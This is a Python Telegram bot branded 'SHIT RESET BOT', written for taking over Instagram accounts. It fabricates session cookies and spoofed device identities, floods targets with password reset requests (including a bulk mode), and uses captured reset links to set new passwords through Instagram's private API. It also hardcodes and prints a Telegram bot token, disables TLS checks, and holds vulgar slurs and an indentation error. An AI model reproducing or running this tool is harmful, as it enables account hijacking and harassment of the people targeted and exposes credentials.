import telebot
import httpx
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import base64
import secrets
from hashlib import md5

# Install missing packages
try:
    import requests
    import pyfiglet
    from rich.console import Console
except ImportError:
    os.system("pip install httpx httpx[http2] user_agent requests telethon pyfiglet rich cfonts beautifulsoup4 colorama python-telegram-bot")

# Initialize colorama
init(autoreset=True)

# Telegram Bot Token
BOT_TOKEN = "8646006227:AAH1H2yPBejHpg6ugmp132lPfiVDn1VOzvU"
bot = telebot.TeleBot(BOT_TOKEN)

# Enhanced Color Theme (Pastel, Neon, Deep Dreamy)
# Basic Colors
RED = '\033[1;31m'
CYAN = '\033[1;96m'
YELLOW = '\033[1;93m'
WHITE = '\033[1;37m'
MAGENTA = '\033[1;95m'
GREEN = '\033[1;32m'

# Pastel Colors
PASTEL_PINK = '\033[38;5;213m'  # Soft Pink
PASTEL_BLUE = '\033[38;5;117m'  # Soft Blue
PASTEL_PURPLE = '\033[38;5;141m' # Soft Purple
PASTEL_GREEN = '\033[38;5;121m'  # Soft Green
PASTEL_YELLOW = '\033[38;5;229m' # Soft Yellow

# Neon Colors
NEON_PINK = '\033[38;5;198m'     # Hot Pink
NEON_CYAN = '\033[38;5;51m'      # Electric Cyan
NEON_GREEN = '\033[38;5;46m'     # Lime Green
NEON_PURPLE = '\033[38;5;93m'    # Electric Purple

# Deep Dreamy Colors
DREAMY_VIOLET = '\033[38;5;54m'  # Deep Violet
DREAMY_TEAL = '\033[38;5;23m'    # Deep Teal
DREAMY_MAROON = '\033[38;5;52m'  # Deep Maroon
DREAMY_INDIGO = '\033[38;5;17m'  # Deep Indigo

SATAN_SYMBOL = '𖤐'

# Global user states
user_states = {}
chat_ids = {}

def generate_cookies():
    """Generate realistic Instagram session cookies"""
    sessionid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=28))
    csrftoken = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    mid = 'V' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    ig_did = str(uuid.UUID(bytes=os.urandom(16), version=4))
    rur = ''.join(random.choices(string.ascii_letters + string.digits + '-', k=40))
    
    cookies = {
        'sessionid': sessionid,
        'csrftoken': csrftoken,
        'mid': mid,
        'ig_did': ig_did,
        'rur': rur,
        'ds_user_id': str(randrange(1000000000, 9999999999)),
        'shbid': str(randrange(1000000, 9999999)),
        'shbts': str(int(time.time())),
    }
    return cookies

def send_telegram(chat_id, text):
    """Send message to Telegram chat"""
    try:
        bot.send_message(chat_id, text, parse_mode='HTML')
    except Exception as e:
        print(f"{RED}[-] Telegram send error: {e}")

def banner_text():
    """Banner text for Telegram with enhanced colors"""
    return f"""
╭━━━〔 ✦ 𝗦𝗛𝗜𝗧𝗦 𝗥𝗘𝗦𝗘𝗧 𝗕𝗢𝗧 ✦ 〕━━━╮
┃
┃  🕊️ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 🕊️
┃  ➤ @x7xtv
┃  ➤ @belt_se_maarkhaunga
┃  ➤ @MAGARMACCCH
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  ✦ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗥𝗘𝗦𝗘𝗧 𝗕𝗢𝗧 ✦
┃  ⌁ 𝗙𝗮𝘀𝘁 • 𝗖𝗹𝗲𝗮𝗻 • 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹
┃
╰━━━〔 𝐒𝐇𝐈𝐓 𝐑𝐄𝐒𝐄𝐓 🦊 〕━━━╯
"""

def rest(user):
    """Send Instagram password reset request - Enhanced with cookies"""
    try:
        # Generate fresh cookies and session
        cookies = generate_cookies()
        
        headers = {
            "x-ig-app-id": "936619743392459",
            "x-instagram-ajax": "1032099486",
            "x-requested-with": "XMLHttpRequest",
            "x-asbd-id": "359341",
            "x-csrftoken": cookies['csrftoken'],
            "user-agent": generate_user_agent(device_type='desktop'),
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-ig-www-claim": "hmac.AR0AAAQAtg7sJ1Wi8NhmXuhR...",
        }

        client = httpx.Client(
            http2=True, 
            cookies=cookies,
            headers=headers, 
            timeout=25,
            verify=False
        )
        
        # First get CSRF token from main page if needed
        preflight = client.get("https://www.instagram.com/accounts/password/reset/")
        
        # Main reset request
        r = client.post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", 
            data={
                "email_or_username": user,
                "recaptcha_challenge_field": "",
                "choice": "1"
            }
        )
        
        response = r.json()
        
        # Check various success indicators
        if r.status_code == 200:
            if 'contact_point' in response:
                return response.get('contact_point', 'Email found')
            elif 'step_name' in response and response['step_name'] == 'select_verified_contact':
                return f"{user} / Reset link sent ✅"
            elif 'message' in response:
                return response['message']
            else:
                return 'Reset link sent successfully ✅'
        else:
            return f'HTTP {r.status_code}: {response.get("message", "Unknown error")}'
            
    except httpx.HTTPStatusError as e:
        return f'HTTP Error {e.response.status_code}: {e.response.text[:200]}'
    except Exception as e:
        return f'Hata: {str(e)}'

def generate_device_info(custom_password=None):
    if custom_password:
        PASSWORD = f'#PWD_INSTAGRAM:0:{int(time.time())}:{custom_password}'
    else:
        custom_passwords = [
            "SHIT@123", "MIAKHALIFA@404", "BABATILLU@999",
            "MAHADEV@123", "KALI@404", "RADHE@404", 
            "LUCIFER@123", "MAXXA#HOTTIE", "ALEXX@BABES",
            "x7xtv@OWNER", "ALEXX@999", "PHERIPHAYAR123#",
            "RAJAT@DALAAL", "LODHALELE#", "CH3T@404",
            "GOD@23", "RANGER@444", "REX@123",
            "RIUXX@456", "CALLKARUBACHAA#", "BHAK.JA.LODE#"
        ]
        PASSWORD = f'#PWD_INSTAGRAM:0:{int(time.time())}:{random.choice(custom_passwords)}'
    
    ANDROID_ID = f"android-{''.join(random.choices('abcdef0123456789', k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {
            "User-Agent": "Instagram 219.0.0.12.117 Android"
        }
        r = requests.get(url, headers=headers)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return "Unknown"
    except:
        return "Unknown"

def reset_instagram_password(reset_link, custom_password=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info(custom_password)
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text}"}

        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2).text
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3)
        new_password = PASSWORD.split(":")[-1]
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def show_main_menu(chat_id):
    """Show main menu"""
    menu_text = f"""
╭━━━〔 ✦ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗣𝗔𝗡𝗘𝗟 ✦ 〕━━━╮
┃
┃  ⦿ 〔1〕 Send Reset Link
┃  ⦿ 〔2〕 Random Password Reset (via link)
┃  ⦿ 〔3〕 Custom Password Reset (via link)
┃  ⦿ 〔4〕 Bulk Reset Multiple IDs
┃
┃  ⦿ 〔0〕 Exit
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  ⌬ 𝗖𝗛𝗢𝗢𝗦𝗘 𝗢𝗣𝗧𝗜𝗢𝗡 :
┃
╰━━━〔 𝗕𝗬 ➤ @greatemperorrr 🇦🇱 〕━━━╯
"""
    bot.send_message(chat_id, menu_text, parse_mode='HTML')

# Handlers
@bot.message_handler(commands=['startSHIT'])
def start_handler(message):
    chat_id = message.chat.id
    print(f"{GREEN}[+] New user: {chat_id}")
    
    welcome_msg = f"""
{banner_text()}

╔═✦ 𝙎𝙃𝙄𝙏 𝙍𝗘𝗦𝗘𝗧 𝗕𝗢𝗧 ✦═╗
║
║   𝗦𝗧𝗔𝗧𝗨𝗦 : 𝐴𝐿𝐼𝑉𝐸 🌷
║
╠═══════════════════════╣
║
║  ⌁ 𝗖𝗛𝗢𝗢𝗦𝗘 𝗢𝗣𝗧𝗜𝗢𝗡 ↓
║
╚═✦ 𝐃𝐄𝐕 - 𝐀𝐋𝐄𝐗 𝐁𝐑𝐎𝐎𝐊𝐄 ✦═╝
"""
    bot.send_message(chat_id, welcome_msg, parse_mode='HTML')
    show_main_menu(chat_id)
    user_states[chat_id] = "main_menu"

@bot.message_handler(commands=['bulk'])
def bulk_handler(message):
    chat_id = message.chat.id
    
    command_text = message.text.strip()
    parts = command_text.split()
    
    if len(parts) < 2:
        bot.send_message(chat_id, f"{YELLOW}[*] <b>Usage: /bulk id1,id2,id3 [custom_passwords]</b>\n\n"
                                   f"<b>Examples:</b>\n"
                                   f"<code>/bulk user1,user2,user3</code> (Random passwords)\n"
                                   f"<code>/bulk user1,user2,user3 PASS123</code> (Same custom password)\n"
                                   f"<code>/bulk user1,user2,user3 pass1,pass2,pass3</code> (Different passwords)",
                         parse_mode='HTML')
        return
    
    ids_part = parts[1]
    ids = [id.strip() for id in ids_part.split(',')]
    
    passwords = []
    if len(parts) > 2:
        passwords_part = parts[2]
        passwords = [p.strip() for p in passwords_part.split(',')]
    
    if not ids or all(not id for id in ids):
        bot.send_message(chat_id, f"{RED}[-] <b>No valid IDs provided! 𖤐</b>", parse_mode='HTML')
        return
    
    bot.send_message(chat_id, f"{YELLOW}[*] <b>Processing {len(ids)} accounts...\n"
                               f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>", parse_mode='HTML')
    
    results = []
    success_count = 0
    
    for i, user_id in enumerate(ids):
        if not user_id:
            continue
            
        if passwords:
            if len(passwords) == 1:
                custom_pass = passwords[0]
            elif i < len(passwords):
                custom_pass = passwords[i]
            else:
                custom_pass = None
        else:
            custom_pass = None
        
        result = rest(user_id)
        
        if result and not result.startswith('Hata'):
            success_count += 1
            results.append(f"✅ <code>{user_id}</code> - Reset link sent")
        else:
            results.append(f"❌ <code>{user_id}</code> - Error: {result}")
        
        time.sleep(0.5)
    
    result_text = f"╭━━━〔 ✦ BULK RESET RESULTS ✦ 〕━━━╮\n"
    result_text += f"┃  <b>Accounts Processed:</b> {len(ids)}\n"
    result_text += f"┃  <b>Successful:</b> {success_count}\n"
    result_text += f"┃  <b>Failed:</b> {len(ids) - success_count}\n"
    result_text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    result_text += f"┃  <b>Detailed Results:</b>\n"
    for res in results:
        result_text += f"┃  {res}\n"
    result_text += f"╰━━━〔  BULK OPERATION COMPLETE  〕━━━╯"
    
    bot.send_message(chat_id, result_text, parse_mode='HTML')
    show_main_menu(chat_id)
    user_states[chat_id] = "main_menu"

@bot.message_handler(func=lambda message: True)
def message_handler(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if chat_id not in user_states:
        user_states[chat_id] = "main_menu"
    
    state = user_states[chat_id]
    
    if state == "main_menu":
        if text == "1":
            user_states[chat_id] = "waiting_email"
            bot.send_message(chat_id, f"\n[*] <b>SHITS RESET LINK SENDER ACTIVATED 𖤐</b>\n\n<b>Email/Username:</b>", parse_mode='HTML')
        
        elif text == "2":
            user_states[chat_id] = "waiting_reset_link_random"
            bot.send_message(chat_id, f"{SATAN_SYMBOL} <b>Enter Reset Link:</b>", parse_mode='HTML')
        
        elif text == "3":
            user_states[chat_id] = "waiting_reset_link_custom"
            bot.send_message(chat_id, f"{SATAN_SYMBOL} <b>Enter Reset Link:</b>", parse_mode='HTML')
        
        elif text == "4":
            user_states[chat_id] = "waiting_bulk_ids"
            bot.send_message(chat_id, f"{SATAN_SYMBOL} <b>Enter IDs (comma-separated):\n"
                                       f"Example: laudalashun1,gendkachhed,bhaangbh0sda\n"
                                       f",user2,user3 pass123</b>", parse_mode='HTML')
        
        elif text == "0":
            bot.send_message(chat_id, f"[𖤐] <b>BYE BYE... SEE YOU SOON 𖤐</b>", parse_mode='HTML')
            if chat_id in user_states:
                del user_states[chat_id]
        
        else:
            bot.send_message(chat_id, f"[-] <b>YEH KYA DAAL RAHA HAI GAWAAR ! 𖤐</b>", parse_mode='HTML')
    
    elif state == "waiting_email":
        print(f"{YELLOW}[*] Sending reset link to {text}...")
        result = rest(text)
        
        if result and not result.startswith('Hata'):
            success_msg = f"""
╭━━━〔 ✦ 𝘼𝙇𝙀𝙓 𝗥𝗘𝗦𝗘𝗧 ✦ 〕━━━╮
┃  🌷 ⌬ <b>𝗥𝗘𝗦𝗘𝗧 𝗟𝗜𝗡𝗞 𝗦𝗘𝗡𝗧</b> 𖤐
┃
┣━━━━━━━━━━━━━━━━━━━━━━━┫
┃  ⦿ <b>𝗧𝗔𝗥𝗚𝗘𝗧</b>   ⟶ <code>{text}</code>
┃  ⦿ <b>𝗖𝗢𝗡𝗧𝗔𝗖𝗧</b>  ⟶ Mail Check Kar 🌷
┃  ⦿ <b>𝗦𝗧𝗔𝗧𝗨𝗦</b>   ⟶ Reset Link Sent ✅
┣━━━━━━━━━━━━━━━━━━━━━━━┫
┃  ◈ 𝗠𝗘𝗢𝗪 𓆩♡𓆪 🌷
┃  ❝ 𝗕𝘆 @x7xtv 𖤐 ❞
╰━━━〔  𝗦𝗨𝗖𝗖𝗘𝗦𝗦  〕━━━╯

        
"""
            bot.send_message(chat_id, f"\n{result} / <b>Reset link send✅</b>.\n\n{success_msg}", parse_mode='HTML')
            show_main_menu(chat_id)
            user_states[chat_id] = "main_menu"
        else:
            bot.send_message(chat_id, f"{RED}\n❌ <b>ERROR TO SEND RESET: {result}</b>", parse_mode='HTML')
            user_states[chat_id] = "main_menu"
            show_main_menu(chat_id)
    
    elif state == "waiting_reset_link_random":
        print(f"{YELLOW}[*] TRYING TO RESET...")
        result = reset_instagram_password(text)
        
        if result.get("success"):
            user_id = result.get("user_id")
            new_password = result.get("password")
            username = id_user(user_id)
            msg = f'''
╭━━━〔 ✦ 𝗔𝗟𝗘𝗫 𝗥𝗘𝗦𝗘𝗧 ✦ 〕━━━╮
┃  ⌦ 𝗣𝗔𝗦𝗦𝗜𝗢𝗥𝗗 𝗥𝗘𝗦𝗘𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 𖤐
┃
┃  ➤ <b>𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘</b> : <code>{username}</code>
┃  ➤ <b>𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗</b> : <code>{new_password}</code>
┃  ➤ <b>𝗨𝗦𝗘𝗥 𝗜𝗗</b>  : <code>{user_id}</code>
┃
╰━━━〔 𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗚𝗢𝗢𝗗  〕━━━╯

      ◢━━━〔 ✦ 𝗔𝗟𝗘𝗫 ✦ 〕━━━◣
        ❝ 𝗕𝘆 @x7xtv 𖤐 ❞
'''
            bot.send_message(chat_id, f"{GREEN}{msg}", parse_mode='HTML')
        else:
            error_msg = f"[𖤐] <b>RESET FAILED: {result.get('error', 'Unknown error')} 𖤐</b>"
            bot.send_message(chat_id, error_msg, parse_mode='HTML')
        
        show_main_menu(chat_id)
        user_states[chat_id] = "main_menu"
    
    elif state == "waiting_reset_link_custom":
        user_states[chat_id] = {"link": text, "waiting_custom_pass": True}
        bot.send_message(chat_id, f"{SATAN_SYMBOL} <b>Enter Custom Password:</b>", parse_mode='HTML')

    elif isinstance(state, dict) and state.get("waiting_custom_pass"):
        custom_pass = text
        reset_link = state["link"]
        print(f"{YELLOW}[*] PROCESSING CUSTOM PASSWORD RESET...")
        result = reset_instagram_password(reset_link, custom_pass)
        
        if result.get("success"):
            user_id = result.get("user_id")
            new_password = result.get("password")
            username = id_user(user_id)
            msg = f'''
╭━━━〔 🍓 𝐀𝐋𝐄𝐗 𝐂𝐔𝐒𝐓𝐎𝐌 🍓 〕━━━╮
┃  ⌦ [ <b>𝐂𝐔𝐒𝐓𝐎𝐌 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐑𝐄𝐒𝐄𝐓</b> 𖤐 ]
┃
┃  [+] <b>𝐔𝐬𝐞𝐫𝐧𝐮𝐦𝐞:</b> <code>{username}</code>
┃  [+] <b>𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝:</b> <code>{new_password}</code>
┃  [+] <b>𝐔𝐬𝐞𝐫 𝐈𝐃:</b> <code>{user_id}</code>
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃  ◢─────━ <b>𝐀𝐋𝐄𝐗</b> ░━──────◣
┃  <b>❝ 𝐁𝐲 @x7xtv 𖤐 ❞</b>
╰━━━〔 ⚡ 𝐎𝐏𝐄𝐑𝐀𝐓𝐢𝐎𝐍 𝐂𝐎𝐌𝗣𝗟𝗘𝗧𝗘 ⚡ 〕━━━╯
'''
            bot.send_message(chat_id, f"{GREEN}{msg}", parse_mode='HTML')
        else:
            error_msg = f"{RED}[𖤐] <b>CUSTOM RESET FAILED: {result.get('error', 'Unknown error')} 𖤐</b>"
            bot.send_message(chat_id, error_msg, parse_mode='HTML')
        
        show_main_menu(chat_id)
        user_states[chat_id] = "main_menu"
    
    elif state == "waiting_bulk_ids":
        # Process bulk IDs from menu option
        ids = [id.strip() for id in text.split(',') if id.strip()]
        if not ids:
            bot.send_message(chat_id, f"[-] <b>No valid IDs provided! 𖤐</b>", parse_mode='HTML')
            show_main_menu(chat_id)
            user_states[chat_id] = "main_menu"
            return
        
        bot.send_message(chat_id, f"{YELLOW}[*] <b>Processing {len(ids)} accounts...</b>", parse_mode='HTML')
        
                results = []
        success_count = 0
        
        for user_id in ids:
            result = rest(user_id)
            if result and not result.startswith('Hata'):
                success_count += 1
                results.append(f"✅ <code>{user_id}</code> - Reset link sent")
            else:
                results.append(f"❌ <code>{user_id}</code> - Error: {result}")
            time.sleep(0.5)
        
        result_text = f"{RED}╭━━━〔 ✦ BULK RESET RESULTS ✦ 〕━━━╮\n"
        result_text += f"┃  <b>Accounts Processed:</b> {len(ids)}\n"
        result_text += f"┃  <b>Successful:</b> {success_count}\n"
        result_text += f"┃  <b>Failed:</b> {len(ids) - success_count}\n"
        result_text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        result_text += f"┃  <b>ＲＥＳＵＬＴＳ>\n"
        for res in results:
            result_text += f"┃  {res}\n"
        result_text += f"╰━━━〔 ⚡ BULK RESET SEND ⚡ 〕━━━╯"
        
        bot.send_message(chat_id, result_text, parse_mode='HTML')
        show_main_menu(chat_id)
        user_states[chat_id] = "main_menu"

if __name__ == "__main__":
    print(f"{YELLOW}[+] ALEX RESET BOT STARTED!")
    print(f"{RED}[+] Bot Token: {BOT_TOKEN}")
    print(f"{YELLOW}[*] Press Ctrl+C to stop")
    
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except KeyboardInterrupt:
        print(f"\n{RED}[+] Bot stopped by user")
    except Exception as e:
        print(f"{RED}[-] Bot error: {e}")

